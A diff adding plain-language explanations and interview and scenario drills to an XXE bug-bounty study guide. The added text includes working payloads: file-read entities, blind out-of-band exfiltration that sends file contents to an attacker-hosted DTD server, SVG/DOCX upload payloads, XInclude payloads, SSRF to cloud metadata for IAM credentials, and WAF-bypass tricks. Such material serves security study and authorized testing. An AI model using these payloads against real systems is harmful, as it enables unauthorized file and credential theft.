@@ -29,6 +29,8 @@
 - **Level 8 — Escalation & per-parser behavior** (Q77–Q86)
 - **Level 9 — WAF bypass & tooling** (Q87–Q93)
 - **Level 10 — Severity, false positives & defense** (Q94–Q100)
+- **Level 11 — Interview drill (rapid-fire concepts)** (Q101–Q112)
+- **Level 12 — Scenario drill (you're on a target, what now?)** (Q113–Q120)
 
 ---
 
@@ -38,6 +40,7 @@
 A vulnerability where an application **parses attacker-controlled XML** with a parser that **resolves external
 entities**, letting you make the server read local files, send server-side requests (SSRF), exfiltrate data
 out-of-band, and sometimes achieve RCE. It's **CWE-611**.
+> *Plain version:* XML lets a document define abbreviations ("entities"). An *external* one abbreviates *"the contents of this file or URL,"* and a naive parser will actually go **fetch it and paste it in.** XXE = you write that abbreviation pointing at the server's own secret files or internal addresses, and the server fetches them for you. It's not code injection — it's abusing a built-in XML feature as a "fetch me any file/URL" button.
 
 ### Q2. What is a DTD and an entity?
 A **DTD** (Document Type Definition) declares a document's structure inside a `<!DOCTYPE …>`. An **entity** is a named
@@ -45,6 +48,8 @@ placeholder: `<!ENTITY name "value">` and `&name;` inserts the value. An **exter
 `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — and *that* dereference is the vulnerability.
 
 ### Q3. Internal vs external vs parameter entities?
+> *Plain version:* three flavors of abbreviation. **Internal** = a plain text shortcut (`&x;` → "abc") — harmless, you use it just to prove the parser expands abbreviations at all. **External** = the dangerous one, `&x;` → *the contents of a file/URL* (the actual XXE). **Parameter** (`%p;`) = a special kind usable only *inside* the DTD instructions — the extra tool you need to pull off the multi-step blind/OOB tricks.
+
 - **Internal general:** `<!ENTITY x "abc">` → `&x;`. (Safe; used for detection.)
 - **External general:** `<!ENTITY x SYSTEM "file://…">` → `&x;` pulls a file/URL. (The core XXE.)
 - **Parameter:** `<!ENTITY % p "…">` → `%p;`, usable **only inside the DTD**. Essential for **blind/OOB** and error-based
@@ -64,6 +69,8 @@ occasionally **RCE**. Source+secrets or cloud creds is frequently a full comprom
 If `&xxe;`'s value is reflected → in-band file read. Everything else is a variation on getting the dereference to happen and getting the data back.
 
 ### Q6. What are the four observability classes?
+> *Plain version:* four ways to *get the fetched data back*, and you pick your technique by which one you have. **In-band** = the server echoes it straight back to you (easiest). **Blind/OOB** = nothing shows, so you make the server *mail it to your own server*. **Error-based** = nothing shows, no outbound allowed, but the server prints verbose errors, so you smuggle the file into an error message. **Fully blind** = nothing at all — you can still prove the bug exists with a DNS ping-back.
+
 - **In-band:** the entity value is **reflected** in the response → read files directly (Q21).
 - **Blind / OOB:** nothing reflected, but the parser makes **outbound** requests → exfil via an external DTD (Q39).
 - **Error-based:** no OOB, but the parser **echoes errors** → force file contents into an error (Q51).
@@ -236,6 +243,8 @@ supported by XML parsers, so gopher-based SSRF usually needs a different primiti
 # LEVEL 4 — BLIND / OOB EXFILTRATION
 
 ### Q39. What is blind/OOB XXE and why is it the workhorse?
+> *Plain version:* the real-world default, because most apps parse your XML but show you nothing. Since you can't read the file off the page, you make the server **mail it to you**: your XML tells it to fetch a tiny instruction file from *your* server, and that instruction says "read this local file, then request `http://my-server/?x=<the contents>`." The secret lands in your access log. No reflection required.
+
 When nothing is reflected but the parser can make **outbound** requests, you use an **external DTD** on your server plus
 **parameter entities** to read a file and send it to you inside a URL. It's the standard technique for the common
 "nothing comes back" real-world case.
@@ -377,6 +386,8 @@ your OOB listener. Same OOB mechanics (Q40), just delivered via the content-type
 # LEVEL 7 — FILE-UPLOAD XXE
 
 ### Q67. Why are file uploads a top XXE surface?
+> *Plain version:* because lots of "image" and "document" formats are **secretly XML underneath** — an SVG is XML, a Word/Excel file is a ZIP full of XML — so when you upload one and the app makes a thumbnail or extracts text, it *parses that XML* and expands your baked-in fetch-me-a-file entity. Upload an avatar SVG or a "resume" DOCX and the server reads its own secrets while generating your preview.
+
 Because the app **parses the uploaded file server-side** (thumbnailing, text extraction, conversion, preview) — and
 many upload formats are **XML under the hood** (SVG, DOCX/XLSX/PPTX, PDF, RSS, SAML, KML). The parse happens without
 the user even seeing raw XML.
@@ -558,6 +569,78 @@ strip DOCTYPE from uploaded SVG/OOXML before parsing, validate/allow-list, run p
 outbound network** (so even a missed setting can't reach files/metadata/your OOB server), and keep parser libraries
 patched. Do that and the whole attack tree here — in-band read, `php://filter` source, SSRF→cloud-creds, blind OOB,
 error-based, XInclude, upload XXE, RCE — collapses.
+
+---
+
+# LEVEL 11 — INTERVIEW DRILL (rapid-fire concepts)
+
+> Tight, correct answers to what an interviewer or a fellow hunter fires at you. Name the mechanism, name the observability class, end on impact.
+
+### Q101. In one sentence, what is XXE and why is it High–Critical?
+XXE is abusing an **XML parser that resolves external entities/DTDs** on attacker input, so the server reads its own **files**, makes **outbound requests** (SSRF), and sometimes runs **code** — the ceiling is file read → cloud-credential theft → RCE, not a cosmetic parse bug.
+
+### Q102. Explain internal vs external vs parameter entities.
+An **internal** entity is a local text macro (`<!ENTITY a "x">` → `&a;`), used to *prove expansion* safely. An **external** general entity pulls an external resource (`<!ENTITY a SYSTEM "file:///etc/passwd">`) — the classic in-band read. A **parameter** entity uses `%name;` and is only valid *inside the DTD* — it's the one that survives hardening and powers the **blind OOB / error-based** tricks because you can nest one entity's declaration inside another.
+
+### Q103. What are the four observability classes, and why do they matter?
+**In-band** (value reflects → read files directly), **blind/OOB** (nothing reflects but the parser makes outbound calls → exfil via external DTD + parameter entities), **error-based** (no outbound but verbose parser errors → force file contents into an error path), and **DoS** (entity expansion / billion-laughs — know it, don't fire it). They matter because they dictate your *technique*: no reflection doesn't mean no XXE, it means switch class.
+
+### Q104. Why is the first real payload an INTERNAL entity, never `file:///etc/passwd`?
+Because an internal entity (`<!ENTITY test "marker">`) is **benign** — no file access, no network — and it cleanly answers "does this parser even expand entities?" without touching secrets or tripping DLP. If the marker reflects you're in-band; if not you're blind. Jumping straight to `file://` risks reading real secrets you don't need and can look like a live attack (PoC discipline).
+
+### Q105. The endpoint "only accepts JSON." Is XXE off the table?
+No. Many frameworks pick the parser by **`Content-Type`**, so flipping `application/json` → `application/xml` (or `text/xml`) and sending the equivalent XML can hit a live XML parser. "We return JSON" is never a valid dismissal — content-type switching is a classic missed win.
+
+### Q106. Walk the blind-OOB exfil mechanism.
+Submit a DOCTYPE that pulls an **external DTD** from your server (`<!ENTITY % ext SYSTEM "http://oob/evil.dtd"> %ext;`). Your `evil.dtd` declares `%file` = the target file, then `%eval` builds a `%exfil` entity whose URL embeds `%file`, then invokes `%exfil` — the server requests `http://oob/?x=<file-contents>` and the data lands in **your access log**. `&#x25;` (`%`) is needed to declare a parameter entity inside another entity.
+
+### Q107. `file:///etc/passwd` works but reading `config.php` fails — why, and the fix?
+Source/config files contain `<` and `&`, which break the XML parse when injected raw as an entity value. Fix: read through **`php://filter/convert.base64-encode/resource=config.php`** (PHP) so the value is safe base64, or wrap in CDATA. `/etc/passwd` has none of those chars, so it "just works" — which is exactly why it's the proof file, not the loot.
+
+### Q108. How is XXE the mindset-opposite of an injection like SQLi?
+SQLi/XSS *inject into a language you break out of*; XXE **abuses a legitimate, spec'd feature** (external entities) that the parser is *designed* to resolve — you're not escaping a context, you're asking the parser to do exactly what the standard permits against unsafe defaults. The fix is therefore a **parser setting** (disable DTDs/external entities), not output encoding.
+
+### Q109. No reflection, and outbound egress is firewalled. Any XXE left?
+Yes — **error-based** with a **local DTD reuse**. Point a parameter entity at a DTD file already on the box (many ship with the OS/app), redefine one of its entities to embed your file read, and force a parse **error** whose message prints the file contents. No attacker server, no outbound needed.
+
+### Q110. Why are file uploads the richest modern XXE surface?
+Because "images" and "documents" are XML underneath: **SVG is XML**, **DOCX/XLSX/PPTX are ZIPs of XML**, as are many PDFs/feeds/maps. The app parses them server-side to thumbnail/convert/extract — so a DOCTYPE inside `word/document.xml` or an avatar SVG makes the server read its own secrets, usually **blind-OOB**. Real bounties: SVG→SSRF, DOCX→OOB file read.
+
+### Q111. What's the single fix that kills every XXE class at once?
+**Disable DOCTYPE / external-entity processing** in every parser touching untrusted XML (`disallow-doctype-decl=true`, `XmlResolver=null`, `defusedxml`, don't enable `NOENT`/`DTDLOAD`). That one setting neutralizes in-band, blind, error-based, SSRF, and XInclude simultaneously — defense-in-depth (no outbound, least privilege, patch parsers) is secondary.
+
+### Q112. What separates a Medium XXE from a Critical one in the report?
+The **escalation**. `/etc/passwd` reflected is a Medium *proof of primitive*; the Critical is what you did with it — read **`.env`/keys/source**, pivoted the same read to **`169.254.169.254` → IAM credentials**, or reached **RCE** (`expect://`/`jar:`/gadget). Report the ceiling you demonstrated, titled by impact, CWE-611 (+918 for the SSRF chain).
+
+---
+
+# LEVEL 12 — SCENARIO DRILL (you're on a target — what now?)
+
+> Realistic "you see X, do Y" situations. Each answer is the decision + the next concrete move.
+
+### Q113. A `POST /api/import` takes `application/xml` and echoes a field back. First move?
+Benign-first: send an **internal-entity canary** (`<!ENTITY test "marker">` → `&test;`). If `marker` reflects, you're **in-band** — define `<!ENTITY xxe SYSTEM "file:///etc/hostname">` to prove file read, then escalate the target to `.env`/`web.config`/keys (base64 via `php://filter` if the file has `<`/`&`). If it doesn't reflect, pivot to blind (Q115).
+
+### Q114. The endpoint is documented "JSON only" and rejects your XML body. Move?
+Flip the **`Content-Type`** header to `application/xml`/`text/xml` and resend the same data as XML — frameworks often select the parser off the header. If it now parses, run the internal-entity canary. If it still 415s, check for **XInclude** in any field the app drops into *its own* XML, and for XML-backed **uploads** (SVG/DOCX) on the same app.
+
+### Q115. Parser expands entities but the response reflects nothing. Move?
+**Blind OOB.** Host `evil.dtd` (parameter-entity chain: `%file` read → `%eval` builds `%exfil` → invoke) and submit a trigger that pulls it (`<!ENTITY % ext SYSTEM "http://oob/evil.dtd"> %ext;`). Watch your listener for `GET /evil.dtd` then `GET /leak?x=<hostname>`. Read a benign file first, then escalate `%file` to the cloud metadata URL for IAM creds.
+
+### Q116. Your OOB listener never gets a hit, but stack traces show in responses. Move?
+Egress is likely blocked — switch to **error-based**. Define a parameter-entity chain that embeds the file read into a *non-existent* path (`file:///nonexistent/%file;`) and force the parse error; the parser prints the failed path **including the file contents**. If you also can't reach your own DTD, reuse a **local DTD** already present on the box (§ error-based/local-DTD reuse).
+
+### Q117. An avatar upload accepts SVG and shows a converted PNG. Move?
+SVG *is* XML — upload one with `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>` and `&xxe;` inside a `<text>` node, then **view the rendered image/its text** to leak the file (in-band), or use the parameter-entity DTD for blind-OOB if nothing renders. Then try a **DOCX/"resume"** upload (zipped XML) on any import/preview feature. Delete artifacts after.
+
+### Q118. You can't add a DOCTYPE — the app wraps your input inside its own XML, or DOCTYPEs are filtered. Move?
+Use **XInclude**: inject `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` into the one node you control. XInclude needs **no DOCTYPE**, so it beats "DOCTYPE blocked" defenses; combine with `php://filter` for source/binaries.
+
+### Q119. In-band read works — you have `/etc/passwd`. How do you make it a Critical, safely?
+Escalate the *target*, not the volume: read **`.env`/`web.config`/app config/`id_rsa`/`/proc/self/environ`** (redact in the report), then pivot the same primitive to **SSRF** — `file://`→`http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → IAM creds. Validate the creds **once** with `aws sts get-caller-identity`, redact the account ID, and **stop** — don't pivot into the account without explicit authorization.
+
+### Q120. A WAF blocks your payload the moment it sees `<!DOCTYPE` or `SYSTEM`. Move?
+Route around the signature: **UTF-16 (or UTF-7) encode** the whole body so the WAF's ASCII match misses but the parser still reads it; use `PUBLIC` instead of `SYSTEM` (`<!ENTITY x PUBLIC "id" "file:///etc/passwd">`); swap the protocol (`netdoc:`/`jar:`/`gopher:`); or drop DOCTYPE entirely and use **XInclude**. Confirm the parser still executed via your OOB canary before assuming the bypass worked.
 
 ---
 
